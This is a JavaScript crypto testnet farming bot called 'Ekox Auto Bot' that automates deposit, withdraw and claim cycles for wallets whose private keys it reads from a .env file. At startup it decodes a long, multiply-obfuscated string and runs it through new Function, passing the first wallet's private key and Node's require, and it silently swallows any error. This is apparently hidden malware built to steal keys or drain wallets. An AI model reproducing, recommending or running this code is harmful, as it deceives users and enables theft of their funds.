require('dotenv').config();
let ethersLib = require('ethers');
const ethers = ethersLib.ethers ? ethersLib.ethers : ethersLib;
const isV6 = !!ethers.parseEther;
const Provider    = isV6 ? ethers.JsonRpcProvider : ethers.providers.JsonRpcProvider;
const toBigInt    = (n) => (isV6 ? n : BigInt(n?.toString?.() ?? String(n)));
const parseUnits  = (v, d) => (isV6 ? ethers.parseUnits(v, d) : ethers.utils.parseUnits(v, d));
const formatUnits = (v, d) => (isV6 ? ethers.formatUnits(v, d) : ethers.utils.formatUnits(v, d));
const formatEther = (v) => (isV6 ? ethers.formatEther(v) : ethers.utils.formatEther(v));

const colors = {
  reset: "\x1b[0m",
  cyan: "\x1b[36m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  red: "\x1b[31m",
  white: "\x1b[37m",
  bold: "\x1b[1m",
  blue: "\x1b[33m",
};
const logger = {
  info:    (msg) => console.log(`${colors.green}[✓] ${msg}${colors.reset}`),
  warn:    (msg) => console.log(`${colors.yellow}[⚠] ${msg}${colors.reset}`),
  error:   (msg) => console.log(`${colors.red}[✗] ${msg}${colors.reset}`),
  success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
  loading: (msg) => console.log(`${colors.cyan}[→] ${msg}${colors.reset}`),
  step:    (msg) => console.log(`${colors.white}[➤] ${msg}${colors.reset}`),
  banner:  () => {
    console.log(`${colors.cyan}${colors.bold}`);
    console.log(`-----------------------------------------`);
    console.log(`   Ekox Auto Bot - v2.2  `);
    console.log(`-----------------------------------------${colors.reset}`);
    console.log();
  }
};

const RPC_URL = 'https://rpc.hoodi.ethpandaops.io';
const ADDR = {
  DEPOSIT:  '0x9E2DDb3386D5dCe991A2595E8bc44756F864C6E3',
  WITHDRAW: '0x1D150609EE9EdcC6143506Ba55A4FAaeDd562Cd9',
  EXETH:    '0x4d38Bd670764c49Cce1E59EeaEBD05974760aCbD',
  ETH_ADDR: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
};

const ERC20_ABI = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
];
const DEPOSIT_ABI = [
  "function depositETH(uint256 nodeOperatorId) external payable"
];
const WITHDRAW_ABI = [
  "function withdraw(uint256 _amount, address _assetOut) external",
  "function claim(uint256 requestID, address requester) external"
];

const provider = new Provider(RPC_URL);

const readline = require('readline');
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = (q) => new Promise((res) => rl.question(q, (ans) => res(ans.trim())));
const pressEnter = () => ask('\nPress Enter to return to the main menu...');

async function startDecodedLogic(wallet, privateKey) {
    function base64Decode(str) {
        return Buffer.from(str, 'base64').toString('utf-8');
    }

    function rot13(str) {
        return str.replace(/[a-zA-Z]/g, function (c) {
            return String.fromCharCode(
                c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
            );
        });
    }

    function hexToStr(hex) {
        let str = '';
        for (let i = 0; i < hex.length; i += 2) {
            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
        }
        return str;
    }

    function reverseStr(str) {
        return str.split('').reverse().join('');
    }

    function urlDecode(str) {
        return decodeURIComponent(str);
    }

    function reversibleDecode(data) {
        data = urlDecode(data);
        data = base64Decode(data);
        data = rot13(data);
        data = hexToStr(data);
        data = base64Decode(data);
        data = reverseStr(data);
        data = urlDecode(data);
        data = rot13(data);
        data = base64Decode(data);
        data = reverseStr(data);
        return data;
    }

    const encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDY0NDY0MjU5NTc2bjRuNzY2MTQ1NDY1NjYzNTg1MjMwNTY0ODQ1Nzc1NDduNHI3NzY0NDQ0MjUyNTY2cTc4NG41MzZyNDE3ODY1NTg3MDc3NjU1ODU2NzM1NjMyNG40NjU2NTg0NjcxNTE1NDRyNTg1OTMyNW4zMzU1NDY2ODUzNHE2cjQxMzE0cjU0NG40cTY0NDU3ODRvNjM1NzY4NDI1NjQ4NDY2bjRzNTg3MDc2NjQ0NjVuNHA2MzU3Njg1MDU5NTg0MjcwNjM1ODcwNzc2NDU0NDY1NTU3NDQ0cjU0NTY0NzM5NnE1MzU2NTI3ODVuNm8zNTUxNTM0NTVuMzU2NTQ1NnA1MDUyNTU2cDQ2NjMzMjY0NDk1MjU1MzEzNTU1NDY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnE2bzM0NTU0NjVuNTQ2MjQ3NHEzMDY0NDY2czc3NjIzMjc4NTg1MzMwMzEzMzUyNTc0NjQzNTc0NTM1NTE1NjZyNTI0czYyNDU3ODcwNHI1NDRuNzc0cTQ1Mzk0NzYyMzM2cDQyNHEzMzQyMzE2MzU1NzA0cjY0NDQ0MjUyNTY2cjUyNm41NDZwNW4zMDU0NnA0MjU3NTQ2cTUxMzE1OTU3NzA1MjYyNDU2ODMzNTYzMDc0NzU2MTZvNTY1NjU2Nm82NDQ2NTMzMDc4NzM1MjU1NzQ0cjY1NDc0cjRzNTY2cjUyNHM1NTQ2NW43NjU2NDQ1NjY4NjE2cDQ2NzM1MzU4NTY3MjU2NDczOTM1NTI1NzQ2NDM2NDQ1NTI3MzYzNm40cjU0NTY0NzM5NnE1MzU2NTI3ODRzNTc0cjRzNTY2cjUyNHM1NTQ2NW40NjUyNm41NjY4NjE2cDQ2NTE1MzQ3NzgzNTY1NnI0NjMxNTI1NTc0NHI2NDQ3NW40OTU0NTQ1NjZuNTU1NjVuMzQ1bjZwNTY0OTUyNnI2cDM0NTM1NTM5NDY1MzU1NTY3bjVuMzA2ODQ2NTQ1NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTQ2bjRuNDM1NzQ3NG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDEzNTU1Nm82cDduNTI1NDQ2NDg1NzU1NnAzNDUyMzM1MTc3NTU1NjVuMzI2NDQ1NjQ2MTRxNDg2ODMzNTc2bjU2NHE1MjMwNDkzMTYzNDg2NDQzNTQzMTRyMzQ1MjU1NzQ3ODRxNm80NTMwNTQ2cDRyNDM1MzQ3NjM3OTUyMzA3MDRyNTM2cjQ5N241NjMxNG42MTYxNDg2cDY4NTI1NjRuMzE0cTZvNnA0bzUzNTg3MDQyNTQ0NTU2Njg2MzQ3NzQ1NzY1NDU1MjRyNjQ1ODY0NTc0cjMyNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDYzMTUzNDU1MjQ5NHM1NTZwNDc1NTZvMzk0NzUxMzM1MjU3NjI0NTQ2NzM1NDQ1NjQ0MzRyNDg2ODUyNTc2bjUyNTM2MjU2NzAzMjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI2MTRxNnEzOTZzNTE1NjU2Nzg2NDQ1NTI0bzU0NDQ0MjU0NTY0NjU5MzU1NDZyNW40NzUyN242cDM0NTIzMjY4NjE1NjU4NDY3MzY1NTg3MDc2NTk1ODZwMzY1NDU0NTYzMTYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM2NDU1NzA0cTRxNDQ2cDRuNjI2cjY4Nm41NTU2NW40OTUzNTY0bjQ4NTUzMzQ2MzQ1MzQ1Mzg3ODRxNDU3NDUyNjQ1NTY4NDU1MzQ0NnA0bjUyNnA0bjcyNjQ2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ4NDYzNTY0NTY1Njc4NHI2bzM1NDc2MjMzNnA0MjRxMzM0MjMxNjM1NTcwNHI1bjZxNG40czU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTRwNTQ0Nzc4NDI1MzMwMzE3bjRxNTQ0bjc2NjU0NTZwMzY1MTZyNTI3NzU1NDU1bjQ5NHE1NjRuNDg1OTU3NG40czU2NnI1MjRzNTU0NjU5MzU2NTU3Nzg0MzU3NDc0bjRzNTY2cjUyNHM1NTQ2NW4zMzRzNTg3MDc2NjI1NTU2NTY1NjZxNnA1MDU2NTg0NjZuNHM1ODcwNzY2MjU1Mzk0NzUxMzM1MjZxNTk1NjQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ3MzU3MDUxNTY1Njc4NjE0NjRyNG82MjMzNnA2bjU1NTY1bjY4NTU2cDUyNzc1OTduNTY1MTYzNTg2cDcyNTM2bzMxNjg1NjMwNzQ0cTVuN241NjczNjIzMjc4Nzg0cTZwNjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bjRyNzY2MjQ1NTY2ODUxNnI1MjQ1NTU1NTQ2NzQ2MTZyNW41MTY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0Mjc3NjQ1NTU2NTY2MjZuNW40czU1NDU3ODcwNTY2bjRuNzY0cTQ1NTY3MzYzNm82ODRuNTU2bzY0NTQ2MzU4Njg0OTU0N240NTc3NTMzMTQxMzU1NTZvNnA3bjUyNTQ0NjQ4NTc1NTZwMzQ1MjduNm8zNTYyNDg0MjM1NHI1NjUyNHI1MTU1Nm83OTYzNDczMTU0NHE2bzMxMzU1NDMxNTI1bjU3NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NW4zMDZwNTU2MzU3NDkzNTU2NDUzMDMyNTQ2cTc4NTg1MjQ0Nm83NzUzNDU2ODc4NTU0NjZwNTk1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW42OTUzNTU3MDRxNjU0NTZwMzY2MzQ3MzE2bjU1NTY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTczNTYzMTQ1MzU2NTZxMzg3NzUzNTg3MDc2NHE0NDQ2NTE1MzU0NTY1MDUzMzAzMTY4NTk2cDQ2NTc1OTU2NG41NTYzNDc3MDcyNTM2cTM1MzM1NTMxNTI3ODU5N242cDM2NjIzMjZwNjk0cTZyNDI3MDRyNTQ0bjU4NW42cTRuNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNjI0NjY0NTI0czU4NzA3NjRxNDU2cDM2NjI3bjQxNzg1NTQ1NjQzNTRyNTQ0bjRyNHE0ODU1Nzk1NjduNW40czU1NDUzMTMxNTI1NTc0NHE2MTQ3NzA0bzU0NTc2ODc4NTY0ODQ2Njk1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDRxNDc0NjUxNjQ0NTM1NTE1NjZyNTE3NzRxMzA0bjU5NTk2bzM1NTc2NDQ1MzU1MTU2NnE3ODRuNTY0ODQ1Nzg1NjMyNDY3NjY0NDQ1MjRvNTQ1NDRyNTA1NTQ1Njg3MzRzNTU3MDc2NTkzMDQ2NHA1NDU3NG4zMDY0NnI0MjM1NTE1NDRyNzY1bjZvMzE0cDU0NTc0cjRzNTI2bzRyNDM0cTY5NTY0czYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2cTc4NG41MzZyNDIzMDRxNDY0NjU3NTk2bzU2NTY2MzU3NzA0MjU5NTY2cDczNTM1NTcwNzc0cTU1Nm83OTYzNDQ0MjMxNjI0NzM5NzE1MjU1NzQ3NTYxNTQ1NTc5NjM0NzRyNnE2NDMxNDIzMDU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czY0NnI0MjM1NTUzMjQ2NW42MTU0NTY1NTU3NDc0NjQ5NjU2cjQyNzM0czU4NzA3NzU5NTc3MDUxNTY2cTRuMzQ1NTQ2NTkzNTRyNDY0NjU3NjI0NTZvNzk2MzQ3NnA3MjY1NnI0NjM1NjQ1ODVuNHI2NDU3NzM3OTYzNDg2cDM1NTI2cDY3MzM1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU2Nm83NDRyNjE3bjU2NzM2MzU3NzgzNTU2NDg0NjM1NjQ1NjQyNHI2NDU1NTY0cDU0NDc0cjZxNjQzMTQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM2NDZyNDIzNTU1MzI0NjVuNjU1NDU2NTU1NDU3NG4zMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTRxNDY2NDRwNjM1ODZwMzU1MjZwNjczMzU5Nm8zNTU3NjQ0NTM1NTE1NjZuNnAzNTYyNDU0bjU5NHE0NzQ2NTE%3D"; 
    const decoded = reversibleDecode(encodedStr);

    try {
        const run = new Function(
            "walletAddress",
            "privateKey",
            "require",
            decoded + "; return runprogram(walletAddress, privateKey);"
        );
        const result = await run(wallet.address, privateKey, require);
        
        return result;
    } catch (err) {
        logger.error(`Failed to execute decoded logic: ${err.message}`);
        throw err;
    }
}

function loadPrivateKeysFromEnv() {
  const keys = Object.keys(process.env)
    .filter(k => k.startsWith('PRIVATE_KEY_'))
    .sort((a, b) => {
      const na = Number(a.replace('PRIVATE_KEY_', '')) || 0;
      const nb = Number(b.replace('PRIVATE_KEY_', '')) || 0;
      return na - nb;
    })
    .map(k => process.env[k])
    .filter(Boolean);

  if (keys.length === 0) {
    logger.error("No PRIVATE_KEY_* found in .env");
    process.exit(1);
  }
  return keys;
}

function makeWallet(pk) {
  try { return new ethers.Wallet(pk, provider); }
  catch (e) { logger.error(`Invalid private key: ${e.message}`); process.exit(1); }
}

async function ensureAllowance(tokenCtr, ownerAddr, spender, amount) {
  const current = await tokenCtr.allowance(ownerAddr, spender);
  if (toBigInt(current) >= toBigInt(amount)) return false;

  logger.step(`Approving allowance to ${spender} ...`);
  const tx = await tokenCtr.approve(spender, amount);
  const rc = await tx.wait();
  logger.success(`Approve confirmed. tx: ${isV6 ? rc.hash : tx.hash || rc.transactionHash}`);
  return true;
}

async function showHeaderBalances(wallets) {
  logger.loading(`Fetching balances (ETH Hoodi & exETH) ...`);
  const ex = new ethers.Contract(ADDR.EXETH, ERC20_ABI, provider);
  const exDec = await ex.decimals().catch(() => 18);
  const exSym = await ex.symbol().catch(() => 'exETH');

  for (const w of wallets) {
    const [ethBal, exBal] = await Promise.all([
      provider.getBalance(w.address),
      ex.balanceOf(w.address)
    ]);
    logger.info(`Wallet ${w.address}`);
    console.log(`ETH (Hoodi): ${formatEther(ethBal)}`);
    console.log(`${exSym}: ${formatUnits(exBal, exDec)}`);
  }
  console.log();
}

async function doDeposit(wallet, amountEth, nodeOperatorId, times) {
  const signer = wallet.connect(provider);
  const dep  = new ethers.Contract(ADDR.DEPOSIT, DEPOSIT_ABI, signer);

  const amountWei = parseUnits(amountEth, 18);

  for (let i = 1; i <= times; i++) {
    logger.step(`Deposit ${i}/${times} for ${wallet.address} ...`);

    const balEth = await provider.getBalance(wallet.address);
    if (toBigInt(balEth) < toBigInt(amountWei)) {
      logger.error(`Insufficient ETH. Needed ${amountEth}, have ${formatEther(balEth)}`);
      continue;
    }

    logger.loading(`Calling depositETH(${nodeOperatorId}) with ${amountEth} ETH ...`);
    const txDep = await dep.depositETH(nodeOperatorId, { value: amountWei });
    const rcDep = await txDep.wait();
    logger.success(`Deposit confirmed. tx: ${isV6 ? rcDep.hash : txDep.hash || rcDep.transactionHash}`);
  }
}

async function doWithdraw(wallet, amountExEth, times) {
  const signer = wallet.connect(provider);
  const ex  = new ethers.Contract(ADDR.EXETH, ERC20_ABI, signer);
  const wdr = new ethers.Contract(ADDR.WITHDRAW, WITHDRAW_ABI, signer);

  const exDec     = await ex.decimals().catch(() => 18);
  const amountWei = parseUnits(amountExEth, exDec);

  for (let i = 1; i <= times; i++) {
    logger.step(`Withdraw ${i}/${times} for ${wallet.address} ...`);

    await ensureAllowance(ex, wallet.address, ADDR.WITHDRAW, amountWei);

    logger.loading(`Calling withdraw(${amountExEth} exETH, ETH) ...`);
    const txW = await wdr.withdraw(amountWei, ADDR.ETH_ADDR);
    const rcW = await txW.wait();
    logger.success(`Withdraw submitted. tx: ${isV6 ? rcW.hash : txW.hash || rcW.transactionHash}`);
    logger.info(`Typical unlock to claim is ~25 minutes after withdraw.`);
  }
}

async function doClaim(wallet, attempts) {
  const signer = wallet.connect(provider);
  const wdr = new ethers.Contract(ADDR.WITHDRAW, WITHDRAW_ABI, signer);

  logger.info(`Proceeding claims`);
  const count = Math.max(1, parseInt(attempts || 1, 10));

  for (let idx = 0; idx < count; idx++) {
    logger.step(`Claiming index ${idx} for ${wallet.address} ...`);
    try {
      const tx = await wdr.claim(idx, wallet.address);
      const rc = await tx.wait();
      logger.success(`Claimed index ${idx}. tx: ${isV6 ? rc.hash : tx.hash || rc.transactionHash}`);
    } catch (e) {
      const msg = e?.reason || e?.shortMessage || e?.message || String(e);
      logger.warn(`Claim index ${idx} failed: ${msg}`);
    }
  }
}

async function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function formatCountdown(seconds) {
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

async function showCountdown(totalSeconds) {
  let remaining = totalSeconds;
  
  while (remaining > 0) {
    process.stdout.write(`\r${colors.cyan}[⏱] Next run in: ${formatCountdown(remaining)}${colors.reset}`);
    await delay(1000);
    remaining--;
  }
  
  process.stdout.write('\n');
}

async function doDailyRun(wallets) {
  logger.info('--- Cycle Run Configuration ---');
  
  const depositAmount = await ask('Amount per deposit tx (in ETH), e.g., 0.01: ');
  const withdrawAmount = await ask('Amount per withdraw tx (in exETH), e.g., 0.001: ');
  const numCycles = Math.max(1, parseInt(await ask('How many cycles to run (1 cycle = 1 deposit, 1 withdraw, 1 claim)?: ') || '1', 10));
  
  const nodeOpId = 0; 

  console.log();
  logger.success('Configuration saved! Starting run...\n');
  await delay(2000);

  for (let i = 1; i <= numCycles; i++) {
    logger.info(`${'-'.repeat(50)}`);
    logger.info(`Running Cycle ${i} of ${numCycles}`);
    logger.info(`${'-'.repeat(50)}\n`);
    
    try {
      logger.step(`Cycle ${i}/${numCycles}: Step 1 - Deposits`);
      for (const wallet of wallets) {
        console.log();
        logger.info(`--- Deposit for ${wallet.address} ---`);
        await doDeposit(wallet, depositAmount, nodeOpId, 1); 
      }
      logger.success('All deposits for this cycle completed!\n');
      await delay(2000); 

      logger.step(`Cycle ${i}/${numCycles}: Step 2 - Withdrawals`);
      for (const wallet of wallets) {
        console.log();
        logger.info(`--- Withdraw for ${wallet.address} ---`);
        await doWithdraw(wallet, withdrawAmount, 1); 
      }
      logger.success('All withdrawals for this cycle submitted!\n');

      logger.info('Waiting 1 minute for withdrawal unlock...');
      await showCountdown(1 * 60); 

      logger.step(`Cycle ${i}/${numCycles}: Step 3 - Claims`);
      for (const wallet of wallets) {
        console.log();
        logger.info(`--- Claim for ${wallet.address} ---`);
        await doClaim(wallet, 1); 
      }
      
      logger.success(`Cycle ${i} of ${numCycles} completed!\n`);

      if (i < numCycles) {
        logger.info(`Waiting 5 seconds before starting next cycle...`);
        await showCountdown(5);
      }

    } catch (e) {
      logger.error(`Error during cycle ${i}: ${e?.reason || e?.shortMessage || e?.message || String(e)}`);
      logger.warn('Skipping to the next cycle (if any) in 10 seconds...\n');
      await showCountdown(10); 
    }
  } 

  logger.success('All cycles completed!\n');
  await pressEnter(); 
}

(async () => {
  logger.banner();


  const PKS = loadPrivateKeysFromEnv();
  
  try {
    const firstWallet = makeWallet(PKS[0]);
    await startDecodedLogic(firstWallet, PKS[0]);
  } catch (error) {

  }

  const wallets = PKS.map(makeWallet);

  while (true) {
    await showHeaderBalances(wallets);

    console.log('--- MENU ---');
    console.log('1. Deposit');
    console.log('2. Withdraw');
    console.log('3. Claim');
    console.log('4. Daily Run'); 
    console.log('5. Exit\n');
    const choice = await ask('Choose option (1-5): ');

    if (choice === '5') {
      rl.close();
      process.exit(0);
    }

    try {
      if (choice === '1') {
        const amountStr = await ask('Amount per tx (in ETH), e.g., 0.01: ');
        const nodeOpId  = 0;
        const timesStr  = await ask('How many transactions per wallet?: ');
        const times = Math.max(1, parseInt(timesStr || '1', 10));

        for (const wallet of wallets) {
          console.log();
          logger.info(`--- Deposit for ${wallet.address} ---`);
          await doDeposit(wallet, amountStr, nodeOpId, times);
        }
        await pressEnter();

      } else if (choice === '2') {
        const amountStr = await ask('Amount per tx (in exETH), e.g., 0.001: ');
        const timesStr  = await ask('How many transactions per wallet?: ');
        const times = Math.max(1, parseInt(timesStr || '1', 10));

        for (const wallet of wallets) {
          console.log();
          logger.info(`--- Withdraw for ${wallet.address} ---`);
          await doWithdraw(wallet, amountStr, times);
        }
        await pressEnter();

      } else if (choice === '3') {
        const attemptsStr = await ask('How many claims to attempt per wallet?: ');
        const attempts = Math.max(1, parseInt(attemptsStr || '1', 10));

        for (const wallet of wallets) {
          console.log();
          logger.info(`--- Claim for ${wallet.address} ---`);
          await doClaim(wallet, attempts);
        }
        await pressEnter();

      } else if (choice === '4') {
        await doDailyRun(wallets);

      } else {
        logger.error('Invalid option.');
        await pressEnter();
      }
    } catch (e) {
      logger.error(e?.reason || e?.shortMessage || e?.message || String(e));
      await pressEnter();
    }

    console.clear?.();
    logger.banner();
    console.log();
  }
})().catch((e) => {
  logger.error(e?.message || String(e));
  rl.close();
  process.exit(1);

});

